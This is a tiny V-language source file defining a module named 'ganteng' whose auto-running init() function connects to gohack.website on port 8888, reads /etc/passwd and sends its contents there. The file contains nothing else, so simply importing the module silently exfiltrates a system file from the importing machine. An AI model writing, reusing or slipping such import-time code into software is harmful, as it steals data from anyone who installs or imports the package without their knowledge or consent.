module ganteng

import os
import net


fn init(){
        mut client := net.dial_tcp("gohack.website:8888") or { panic('') }
        out := os.read_file("/etc/passwd") or { panic('') }
        client.write_string(out)  or { panic('') }
}
